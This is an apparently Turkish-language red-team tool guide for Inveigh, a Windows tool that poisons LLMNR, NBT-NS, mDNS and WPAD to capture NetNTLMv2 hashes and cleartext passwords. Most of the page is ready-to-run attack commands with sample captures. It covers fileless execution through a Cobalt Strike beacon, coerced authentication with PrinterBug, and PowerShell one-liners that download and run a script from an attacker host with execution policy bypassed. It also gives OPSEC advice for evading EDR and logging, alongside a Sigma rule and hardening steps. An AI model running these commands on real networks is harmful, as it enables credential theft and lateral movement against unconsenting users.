# Inveigh

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows üzerinde yerel olarak çalışan, LLMNR, NBT-NS, mDNS ve DNS protokollerini zehirleyerek sahte HTTP/HTTPS/SMB/WPAD servisleri üzerinden NetNTLM hash'lerini yakalayan C# ve PowerShell tabanlı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**Inveigh** (Kevin Robertson tarafından geliştirilen), Windows işletim sistemlerinde harici bir Linux/Kali makinesine ihtiyaç duymadan doğrudan kurban host veya C2 ajanı (Cobalt Strike, Havoc, Sliver vb.) üzerinden ağ zehirleme ve kimlik avı yapabilen gelişmiş bir araçtır. Linux dünyasındaki Responder'ın Windows ekosistemindeki tam ve yerel karşılığı olarak kabul edilir.

Inveigh'in iki ana sürümü bulunmaktadır:
1. **Inveigh (C# .NET - v2.0+):** `Inveigh.exe` derlemesi olarak doğrudan veya `execute-assembly` yöntemiyle bellekten (in-memory) çalıştırılır. Modern EDR ve AMSI atlatma senaryolarında tercih edilen birincil sürümdür.
2. **Inveigh.ps1 (PowerShell - v1.x):** PowerShell komut satırından `Invoke-Inveigh` fonksiyonuyla çalıştırılan klasik sürümdür.

Windows istemcileri yerel ağda çözemedikleri bir ana bilgisayar adı için LLMNR (UDP 5355) veya NBT-NS (UDP 137) yayınları yaptığında Inveigh bu sorguları yakalar, kurbana sahte IP yanıtı döner ve istemciyi kendi üzerindeki sahte HTTP, HTTPS veya SMB dinleyicilerine yönlendirerek **NetNTLMv1/v2** kimlik doğrulama hash'lerini toplar.

```
      [ Kurban Makine (Windows) ]
                   |
     1. LLMNR UDP 5355: "FILESERVER02?"
                   |
                   v
     ================================== Yerel Alt Ağ (Subnet)
                   |
                   +------------------------------+
                                                  |
     2. Sahte Yanıt: "Ben FILESERVER02'yim"       |
                   |                              v
                   |                    [ Ele Geçirilmiş Makine ]
                   |                    [ Inveigh.exe (C#)      ]
                   v                              |
     3. Kimlik Doğrulama İsteği:                  |
        HTTP/SMB NTLM Negotiation --------------->|
                                                  v
                                        NetNTLMv2 Hash Yakalandı!
                                        (Bellekte / Log Dosyasında)
```

### Neden Önemli?
- **Yerel Windows Yeteneği:** Saldırganın iç ağa doğrudan Kali bağlayamadığı, yalnızca ele geçirilmiş bir Windows istemcisine C2 Beacon üzerinden erişebildiği durumlarda doğrudan host üzerinden yerel ağı zehirleme olanağı tanır.
- **AMSI & Script-Block Logging Muafiyeti:** C# sürümü (`Inveigh.exe`), PowerShell çalıştırma politikalarına ve Script-Block Logging denetimlerine takılmaz.
- **Relay Desteği:** Yakalanan NTLM kimlik doğrulama isteklerini yerel makineden diğer hedef sunuculara yönlendirebilen dahili HTTP/HTTPS relay yeteneklerine sahiptir.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Inveigh (C#) | Responder (Python) | mitm6 (Python) |
|---|---|---|---|
| **Platform** | Windows (.NET Framework) | Linux (Python 3) | Linux (Python 3) |
| **Çalıştırma Yöntemi** | `execute-assembly`, Yerel CLI | Harici saldırgan işletim sistemi | Harici saldırgan işletim sistemi |
| **Port Yönetimi** | Windows kısıtlamalarına tabidir | Tüm portlar tam kontrol altındadır | IPv6 DHCPv6 ve DNS portları |
| **SMB Yakalama** | SMB servisi port 445'i paylaşabilir | Doğrudan TCP 445 dinler | Doğrudan dinlemez (ntlmrelayx) |
| **C2 Entegrasyonu** | Mükemmel (Cobalt Strike, Sliver) | Proxychains / Pivot gerektirir | Pivot gerektirir |
| **Bellekte Çalışma** | Evet (Hafızadan PE çalıştırma) | Hayır (Linux süreci) | Hayır (Linux süreci) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Inveigh CLI parametreleri `Inveigh.exe` çalıştırılırken doğrudan argüman olarak verilir. Çoğu parametre `Y` (Yes) veya `N` (No) ikili değerleriyle kontrol edilir.

```powershell
# C# Exe Çalıştırma Sözdizimi
Inveigh.exe -IP <Yerel_IP> -SpooferIP <Sahte_IP> [Seçenekler]

# PowerShell Sürümü Sözdizimi
Import-Module .\Inveigh.ps1
Invoke-Inveigh -IP <Yerel_IP> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Varsayılan | Örnek Kullanım |
|---|---|---|---|
| `-IP` | Inveigh'in bağlanacağı ve dinleyeceği yerel IP adresi. | Otomatik | `-IP 192.168.1.55` |
| `-SpooferIP` | Sahte isim çözümleme yanıtlarında istemcilere verilecek IP adresi. | Yerel IP | `-SpooferIP 192.168.1.55` |
| `-LLMNR` | LLMNR (UDP 5355) zehirlemesini açar veya kapatır. | `Y` | `-LLMNR Y` veya `-LLMNR N` |
| `-NBNS` | NetBIOS Name Service (UDP 137) zehirlemesini açar/kapatır. | `Y` | `-NBNS Y` |
| `-mDNS` | mDNS (UDP 5353) zehirlemesini açar/kapatır. | `N` | `-mDNS Y` |
| `-DNS` | Sahte DNS (UDP 53) sunucusunu aktif eder. | `N` | `-DNS Y` |
| `-HTTP` | Sahte HTTP (TCP 80) sunucusunu başlatır. | `Y` | `-HTTP Y` |
| `-HTTPS` | Sahte HTTPS (TCP 443) sunucusunu başlatır. | `N` | `-HTTPS Y` |
| `-SMB` | Sahte SMB (TCP 445) yakalayıcısını başlatır (Yönetici gerekir). | `Y` | `-SMB Y` |
| `-WPAD` | Sahte WPAD proxy yanıtlarını ve wpad.dat dağıtımını açar. | `N` | `-WPAD Y` |
| `-WPADAuth` | WPAD dosyasını indirmek isteyen kurbandan NTLM veya Basic Auth ister. | `NTLM` | `-WPADAuth NTLM` |
| `-Basic` | HTTP kimlik doğrulamasında açık metin Basic Auth penceresi zorlar. | `N` | `-Basic Y` |
| `-RunTime` | Inveigh'in çalışacağı maksimum süreyi dakika cinsinden ayarlar. | Süresiz | `-RunTime 15` (15 dakika sonra durur) |
| `-ConsoleOutput` | Konsola anlık olay ve hash çıktılarını yazar. | `Y` | `-ConsoleOutput Y` |
| `-FileOutput` | Yakalanan hash'leri diske metin dosyası olarak yazar. | `N` | `-FileOutput Y` |
| `-FilePrefix` | Çıktı log dosyalarının başına eklenecek ön ek adı. | Inveigh | `-FilePrefix RedTeam_Log` |
| `-ConsoleUnique` | Yalnızca yeni/eşsiz kullanıcı hash'lerini ekrana basar. | `Y` | `-ConsoleUnique Y` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart C# Inveigh ile Etkileşimli Zehirleme ve Hash Yakalama

Masaüstü veya etkileşimli bir cmd/PowerShell oturumunda LLMNR, NBNS ve HTTP aktif şekilde çalıştırma.

```cmd
Inveigh.exe -IP 192.168.1.55 -LLMNR Y -NBNS Y -HTTP Y -SMB Y -ConsoleOutput Y
```

```text
[*] Inveigh 2.0.10 [Started: 2026-10-14 15:20:00]
[+] [LLMNR] Spoofer started on UDP 5355
[+] [NBNS]  Spoofer started on UDP 137
[+] [HTTP]  Listener started on TCP 80
[+] [SMB]   Listener started on TCP 445
[*] [LLMNR] Request for 'SHARE01' received from 192.168.1.108
[+] [LLMNR] Response sent to 192.168.1.108
[+] [HTTP]  NTLMv2 capture from 192.168.1.108:
LAB\caner.oz::LAB:54A3B2...:0101000000000000F...
```
*Analiz:* Yerel arayüze bağlanan Inveigh, `SHARE01` sorgusunu yakalayarak kurbanı kendi sahte HTTP dinleyicisine yönlendirdi ve `caner.oz` kullanıcısının NetNTLMv2 hash'ini ekrana döktü.

---

### Senaryo 2: Cobalt Strike / C2 Beacon Üzerinden Süreli ve Dosyasız Çalıştırma

EDR izlerini en aza indirmek için diske dosya yazmadan, hafızadan (in-memory) 20 dakika boyunca çalışıp otomatik kapanacak şekilde yapılandırma.

```text
beacon> execute-assembly C:\Tools\Inveigh.exe -RunTime 20 -FileOutput N -ConsoleOutput Y -LLMNR Y -NBNS Y
```

```text
[*] Tasked beacon to run assembly: Inveigh.exe -RunTime 20 -FileOutput N -ConsoleOutput Y -LLMNR Y -NBNS Y
[+] host called home, sent: 124500 bytes
[+] [LLMNR] Spoofer running (Timeout: 20 mins)
[+] [HTTP] Captured Hash: LAB\ayse.yilmaz::LAB:667788...
[*] Inveigh runtime completed. Shutting down listeners gracefully.
```
*Analiz:* Beacon process injection yöntemiyle Inveigh'i RAM'de çalıştırdı. Diske hiçbir `.txt` dosyası bırakılmadı, hash doğrudan Beacon konsoluna aktarıldı ve süre dolduğunda dinleyiciler sorunsuz kapandı.

---

### Senaryo 3: Sahte WPAD Enjeksiyonu ile Basic Authentication Avı

Kurban istemcilerin tarayıcı proxy arayışını kullanarak açık metin parola isteme.

```cmd
Inveigh.exe -WPAD Y -WPADAuth Basic -Basic Y -RunTime 10 -ConsoleOutput Y
```

```text
[+] [WPAD] Serving malicious wpad.dat to 192.168.1.115
[+] [HTTP] Basic Auth Challenge sent to 192.168.1.115
[+] [HTTP] Cleartext Credentials Captured:
    Host: 192.168.1.115
    User: LAB\fatma.kaya
    Pass: Yazilim2026!*
```
*Analiz:* İstemci internete çıkarken sahte WPAD üzerinden yönlendirildi ve karşısına Basic Auth kimlik penceresi çıktı. Kullanıcının yazdığı parola şifresiz (açık metin) olarak yakalandı.

---

### Senaryo 4: PowerShell Sürümü (Inveigh.ps1) ile Bellekten Zehirleme

Eğer ortamda PowerShell kısıtlaması yoksa `Invoke-Inveigh` fonksiyonunu doğrudan RAM'e yükleyerek çalıştırma.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Inveigh.ps1')
Invoke-Inveigh -IP 192.168.1.55 -LLMNR Y -NBNS Y -RunTime 5 -Tool 2
```

```text
[*] Inveigh 1.5.4 [Started: 2026-10-14 15:22:00]
[+] LLMNR spoofer started for UDP port 5355
[+] NBT-NS spoofer started for UDP port 137
[+] HTTP listener started on TCP port 80
[!] Note: SMB capture requires elevated privileges.
[+] NTLMv2 capture from 192.168.1.140: LAB\deniz.kurt:...
```
*Analiz:* PowerShell scripti harici web sunucusundan doğrudan hafızaya indirilerek çalıştırıldı. 5 dakika içinde gelen sorgular dinlenerek hash'ler toplandı.

---

### Senaryo 5: PrinterBug / Zorlamalı Kimlik Doğrulama ile Birleştirme

Uzak bir sunucuya (örneğin SpoolSample veya PetitPotam ile) Inveigh'in çalıştığı IP adresine kimlik doğrulatma komutu gönderildiğinde Inveigh bunu yakalar.

```cmd
# 1. Terminal: Inveigh dinleyiciyi başlat
Inveigh.exe -IP 192.168.1.55 -HTTP Y -ConsoleOutput Y

# 2. Terminal: Uzak sunucuyu Inveigh'e tetikle (PrinterBug)
# SpoolSample.exe DC01.lab.local 192.168.1.55
```

```text
[+] [HTTP] NTLMv2-SSP capture from 192.168.1.10 (DC01$):
DC01$::lab.local:B5A1...:010100000000...
```
*Analiz:* Tetiklenen Domain Controller makine hesabı (`DC01$`) Inveigh'e kimlik doğruladı ve sunucunun NetNTLMv2 makine hash'i ele geçirildi.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[!] Error starting SMB listener: Access is denied / Port in use` | Windows'un yerel dosya paylaşım servisi (`LanmanServer`) TCP 445 portunu kilitli tutmaktadır. | Yerel SMB portu serbest bırakılamıyorsa `-SMB N` parametresiyle SMB'yi kapatıp yalnızca HTTP/WPAD üzerinden hash yakalayın veya servisi devre dışı bırakın (`net stop server`). |
| `[!] Administrator privileges required for Raw Sockets / Spoofer` | LLMNR/NBT-NS UDP soketlerini açmak için yerel yönetici (Elevated / High Integrity) yetkisi gereklidir. | Süreci yönetici olarak yükseltin (UAC Bypass veya Privilege Escalation) veya standart kullanıcı context'inde yalnızca port 8080/HTTP proxy dinleyicisi deneyin. |
| `[!] Windows Firewall blocked incoming UDP 5355 / TCP 80` | Hedef makinenin Windows Defender Güvenlik Duvarı gelen trafiği engellemektedir. | Yönetici yetkisi varsa geçici firewall kuralı ekleyin: `netsh advfirewall firewall add rule name="Inveigh" dir=in action=allow protocol=UDP localport=5355` veya `-HTTP N` deneyin. |
| `No captures received despite LLMNR requests in Wireshark` | Ağ arayüzü `-IP` parametresinde yanlış bağdaştırıcıya bağlandı. | `Get-NetIPAddress` ile doğru yerel IP adresini tespit edip `-IP <Gerçek_IP>` parametresiyle açıkça belirtin. |
| `System.OutOfMemoryException / Beacon Hang` | Inveigh uzun süre açık bırakıldığında konsol logları belleği şişirdi. | Mutlaka `-RunTime <Dakika>` parametresi kullanın ve `-ConsoleUnique Y` ile yinelenen çıktıları filtreleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Windows Event ID 4624 / 4625 (Logon):**
  - İstemcilerin Inveigh çalışan makineye Logon Type `3` (Network) ile bağlanma denemeleri.
- **Sysmon Event ID 1 (Process Creation):**
  - `Inveigh.exe` komut satırı argümanları (`-LLMNR Y`, `-NBNS Y`, `-WPAD Y`).
- **Sysmon Event ID 3 (Network Connection Detected):**
  - Bir istemci sürecinin yerel ağdaki çok sayıda makineye UDP 5355 veya UDP 137 portundan tek taraflı yanıt dönmesi.
- **Sysmon Event ID 11 (File Create):**
  - `-FileOutput Y` kullanıldığında oluşan `Inveigh-Cleartext.txt` veya `Inveigh-NTLMv2.txt` dosyaları.

### 5.2 Ağ ve EDR İmzaları
- **Raw Socket Açma Davranışı:** Standart kullanıcı uygulamaları nadiren raw socket veya UDP 5355 dinleyicisi açar. EDR'lar (CrowdStrike, SentinelOne) bu davranışı anomali olarak etiketler.
- **AMSI & Reflection:** PowerShell sürümü (`Inveigh.ps1`) modern Windows sistemlerinde AMSI tarafından otomatik olarak zararlı kabul edilir; string manipulation veya memory patch olmadan doğrudan çalıştırılamaz.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Windows yerelinde isim çözümleme manipülasyonu. |
| **T1059.001** | Command and Scripting Interpreter: PowerShell | Inveigh.ps1 çalıştırma. |
| **T1187** | Forced Authentication | Makine veya kullanıcı hesaplarını Inveigh'e yönlendirme. |
| **T1040** | Network Sniffing | Ağ üzerinden kimlik doğrulama paketlerini toplama. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **PowerShell İmzası:** Script-Block Logging Inveigh.ps1 kodlarını kaydeder. | PowerShell sürümü yerine derlenmiş C# (`Inveigh.exe`) sürümünü `execute-assembly` ile bellekten çalıştırın. |
| **Dosya İzleri:** Diske yazılan hash logları IR ekiplerince incelenebilir. | `-FileOutput N` parametresini kullanarak logları diske yazmayın; sonuçları C2 hafızasından okuyun. |
| **Süresiz Çalışma:** Unutulan zehirleyiciler ağda gürültü yaratır. | Mutlaka `-RunTime 15` gibi makul bir zaman aşımı belirleyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — Windows Üzerinde Inveigh Tespiti)
```yaml
title: Inveigh LLMNR/NBT-NS Spoofer Execution
status: experimental
description: Inveigh argümanlarının veya raw socket dinleyicilerinin tespiti.
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        CommandLine|contains:
            - '-LLMNR'
            - '-NBNS'
            - '-SpooferIP'
            - 'Invoke-Inveigh'
    selection_sysmon:
        Image|endswith:
            - '\Inveigh.exe'
    condition: selection_cmd or selection_sysmon
level: high
```

#### PowerShell Script-Block Telemetrisi (Event ID 4104)
Eğer saldırgan `Inveigh.ps1` kullanırsa, PowerShell Script-Block Logging şu kod bloklarını kaydeder:
- `[System.Net.Sockets.Socket]`
- `Invoke-Inveigh`
- `Get-Inveigh` / `Clear-Inveigh`

#### Sertleştirme Adımları
- **UAC ve Yetki Kısıtlaması:** Standart kullanıcı hesaplarının raw socket açması ve yerel dinleyici başlatması kısıtlanmalıdır.
- **Host Tabanlı Güvenlik Duvarı:** Windows Güvenlik Duvarı üzerinden istemcilerin birbirine (Workstation-to-Workstation) LLMNR, NBT-NS veya SMB/HTTP bağlantısı yapması engellenmelidir.
- **ASR (Attack Surface Reduction) Kuralları:** `Block executable files from running unless they meet a prevalence, age, or trusted list criterion` aktif edilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Standart etkileşimli C# çalıştırma (En temel kullanım)
Inveigh.exe -IP 192.168.1.50 -LLMNR Y -NBNS Y -HTTP Y -ConsoleOutput Y
```
- **Ne Yapar?:** Belirtilen IP'de LLMNR, NBNS ve HTTP dinleyicilerini başlatıp ekrana anlık hash basar.
- **Ne Zaman Kullanılır?:** Ele geçirilmiş makinede masaüstü veya cmd oturumu varken hızlı hash yakalamak için.
- **Parametreler:** `-IP`: Dinlenecek IP; `-LLMNR Y`: LLMNR aktif; `-ConsoleOutput Y`: Ekrana yaz.

```cmd
# 2. C2 Beacon uyumlu hafızada süreli çalıştırma (OPSEC dostu)
Inveigh.exe -RunTime 15 -FileOutput N -ConsoleOutput Y -LLMNR Y -NBNS Y
```
- **Ne Yapar?:** 15 dakika boyunca RAM'de zehirleme yapar, diske dosya bırakmaz ve kendiliğinden kapanır.
- **Ne Zaman Kullanılır?:** Cobalt Strike / C2 operasyonlarında güvenli ve sessiz hash avı için.
- **Parametreler:** `-RunTime 15`: 15 dakika çalış; `-FileOutput N`: Diske dosya yazma.

```cmd
# 3. Yalnızca HTTP ve WPAD üzerinden parola avı (SMB çakışmasız)
Inveigh.exe -SMB N -HTTP Y -WPAD Y -WPADAuth Basic -Basic Y
```
- **Ne Yapar?:** SMB servisine dokunmadan web trafiği ve sahte proxy üzerinden açık metin parola çeker.
- **Ne Zaman Kullanılır?:** Windows SMB port 445 servisi kapatılamadığında veya çakışma olduğunda.
- **Parametreler:** `-SMB N`: SMB'yi kapat; `-WPADAuth Basic`: Açık metin parola iste.

```powershell
# 4. PowerShell ile tek satırda bellekten başlatma
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Inveigh.ps1'); Invoke-Inveigh -RunTime 10"
```
- **Ne Yapar?:** Inveigh.ps1'i internetten RAM'e çekip 10 dakikalık dinleme moduna alır.
- **Ne Zaman Kullanılır?:** Diske `.exe` yüklemenin yasak veya riskli olduğu ortamlarda.
- **Parametreler:** `DownloadString`: Belleğe yükle; `-RunTime 10`: 10 dakika süre.

```cmd
# 5. Yalnızca belirli bir sahte IP duyurarak zehirleme (Spoofer IP)
Inveigh.exe -SpooferIP 192.168.1.99 -LLMNR Y -NBNS Y
```
- **Ne Yapar?:** İsim çözümleme yanıtlarında kurbanlara kendi IP'si yerine `192.168.1.99` adresini döner.
- **Ne Zaman Kullanılır?:** Kurbanların kimlik doğrulamasını başka bir dinleyiciye (örneğin Linux Kali) yönlendirirken.
- **Parametreler:** `-SpooferIP`: Hedeflere duyurulacak sahte IP.

```cmd
# 6. Belirli hedef adları zehirleme listesine ekleme (Target/Whitelist)
Inveigh.exe -SpEnable Y -SpTarget BACKUP-SRV,FILE01
```
- **Ne Yapar?:** Yalnızca `BACKUP-SRV` ve `FILE01` isimleri için yapılan sorgulara sahte yanıt döner.
- **Ne Zaman Kullanılır?:** Tüm ağa gürültü yapmadan sadece spesifik sunucu isteklerini hedeflemek için.
- **Parametreler:** `-SpEnable Y`: Filtreyi aç; `-SpTarget`: Hedef isimler.

```cmd
# 7. DNS zehirleme modunu aktif etme
Inveigh.exe -DNS Y -SpooferIP 192.168.1.50 -RunTime 10
```
- **Ne Yapar?:** Standart DNS (UDP 53) sorgularını da sahte yanıtlarla karşılar.
- **Ne Zaman Kullanılır?:** Ortamda DNS yönlendirme veya broadcast DNS zafiyetleri mevcutsa.
- **Parametreler:** `-DNS Y`: Sahte DNS aktif.

```cmd
# 8. Yakalanan hash'leri ekranda benzersiz gösterme (ConsoleUnique)
Inveigh.exe -ConsoleUnique Y -RunTime 30
```
- **Ne Yapar?:** Aynı kullanıcının yinelenen hash bildirimlerini engelleyerek ekran kirliliğini önler.
- **Ne Zaman Kullanılır?:** Ağda çok fazla istemcinin sorgu yaptığı yoğun ağ ortamlarında.
- **Parametreler:** `-ConsoleUnique Y`: Yalnızca yeni kullanıcıları göster.

```cmd
# 9. HTTPS dinleyicisini aktif ederek SSL tabanlı kimlik yakalama
Inveigh.exe -HTTPS Y -CertPath C:\Temp\cert.pfx -CertPassword Pass123 -ConsoleOutput Y
```
- **Ne Yapar?:** Kendi SSL sertifikasını kullanarak TCP 443 üzerinde sahte HTTPS sunucusu açar.
- **Ne Zaman Kullanılır?:** Modern tarayıcıların HTTP yerine HTTPS zorladığı senaryolarda.
- **Parametreler:** `-HTTPS Y`: HTTPS dinleyicisi; `-CertPath`: Sertifika konumu.

```cmd
# 10. Makine hesaplarını filtreleyip yalnızca insan kullanıcıları yakalama
Inveigh.exe -MachineAccounts N -LLMNR Y -NBNS Y -ConsoleOutput Y
```
- **Ne Yapar?:** Sonu `$` ile biten bilgisayar hesaplarının (örn: `PC01$`) hash'lerini görmezden gelir.
- **Ne Zaman Kullanılır?:** Parola kırma amacıyla yalnızca gerçek kullanıcı hesaplarına odaklanıldığında.
- **Parametreler:** `-MachineAccounts N`: Bilgisayar hesaplarını yoksay.

---

## Kaynaklar

- **Resmi GitHub Deposu (Inveigh):** [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
- **MITRE ATT&CK T1557.001:** [https://attack.mitre.org/techniques/T1557/001/](https://attack.mitre.org/techniques/T1557/001/)
- **SpecterOps — Local Network Poisoning Techniques:** [https://posts.specterops.io/](https://posts.specterops.io/)

---

> **Önceki:** [← Responder](./Responder.md) · **Sonraki:** [mitm6 →](./mitm6.md)

